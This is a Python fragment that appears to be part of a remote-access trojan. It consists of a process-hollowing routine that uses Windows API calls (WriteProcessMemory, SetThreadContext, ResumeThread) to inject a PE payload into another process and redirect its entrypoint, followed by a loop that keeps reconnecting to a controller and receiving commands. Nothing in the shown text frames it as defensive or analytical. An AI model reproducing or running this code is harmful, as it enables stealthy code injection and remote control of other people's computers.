                                                 payload_data,
                                                 payload_pe.OPTIONAL_HEADER.SizeOfHeaders,
                                                 None
                                                 ) == 0:
        result += '[-] Error in WriteProcessMemory: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
        return result
    result += '[*] Writing payload sections to target process\n'
    for section in payload_pe.sections:
        section_name = section.Name.decode('utf-8').strip('\x00')
        result += '[*] Writing section {0} (to {1})'.format(section_name,
                                                            hex(allocated_address + section.VirtualAddress)) + '\n'
        if ctypes.windll.kernel32.WriteProcessMemory(process_info.hProcess,
                                                     LPVOID(allocated_address + section.VirtualAddress),
                                                     payload_data[section.PointerToRawData:],
                                                     section.SizeOfRawData,
                                                     None
                                                     ) == 0:
            result += '[-] Error in WriteProcessMemory: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
            return result
    result += '[*] Setting new entrypoint\n'
    context.Rcx = allocated_address + payload_pe.OPTIONAL_HEADER.AddressOfEntryPoint
    result += '[+] New entrypoint: ' + str(hex(context.Rcx)) + '\n'
    result += '[*] Writing base address of payload to target process\n'
    if ctypes.windll.kernel32.WriteProcessMemory(process_info.hProcess,
                                                 LPVOID(context.Rdx + 2 * ctypes.sizeof(ctypes.c_size_t)),
                                                 payload_data[
                                                 payload_pe.OPTIONAL_HEADER.get_field_absolute_offset("ImageBase"):],
                                                 ctypes.sizeof(LPVOID),
                                                 None
                                                 ) == 0:
        result += '[-] Error in WriteProcessMemory: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
        return result
    result += '[*] Setting modified context\n'
    if ctypes.windll.kernel32.SetThreadContext(process_info.hThread, ctypes.byref(context)) == 0:
        result += '[-] Error in SetThreadContext: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
        return result
    result += '[*] Resuming context\n'
    if ctypes.windll.kernel32.ResumeThread(process_info.hThread) == 0:
        result += '[-] Error in ResumeThread: {0}'.format(ctypes.FormatError(ctypes.GetLastError())) + '\n'
        return result
    return result


while True:
    client = Client()
    client.connect()
    while True:
        try:
            client.recv_commands()
        except socket.error as e:
            print(e)
            client.socket.close()
            client.socket = socket.socket()
            break
        except Exception as ex:
            print(ex)
            continue
